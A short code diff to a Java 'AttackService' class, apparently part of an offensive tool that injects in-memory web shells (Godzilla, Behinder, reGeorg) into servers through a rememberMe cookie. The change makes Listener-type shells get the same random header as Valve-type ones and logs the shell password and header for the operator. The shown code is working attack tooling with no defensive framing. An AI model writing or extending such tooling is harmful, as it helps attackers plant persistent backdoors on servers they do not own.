@@ -424,7 +424,7 @@ public class AttackService {
             header.put("Cookie", injectRememberMe);
             header.put("p", shellPass);
             header.put("path", shellPath);
-            if (memShellType.equals("哥斯拉[Valve]") || memShellType.equals("冰蝎[Valve]")) {
+            if (memShellType.equals("哥斯拉[Valve]") || memShellType.equals("冰蝎[Valve]") || memShellType.equals("哥斯拉[Listener]") || memShellType.equals("冰蝎[Listener]")) {
                 header.put("h", randomHeader);
             }
 
@@ -439,7 +439,7 @@ public class AttackService {
                     if (!memShellType.equals("reGeorg[Servlet]")) {
                         this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
                     }
-                    if (memShellType.equals("哥斯拉[Valve]") || memShellType.equals("冰蝎[Valve]")) {
+                    if (memShellType.equals("哥斯拉[Valve]") || memShellType.equals("冰蝎[Valve]") || memShellType.equals("哥斯拉[Listener]") || memShellType.equals("冰蝎[Listener]")) {
                         this.mainController.InjOutputArea.appendText(Utils.log("请求头：" + randomHeader + ": " + randomHeader));
                     }
                 } else {
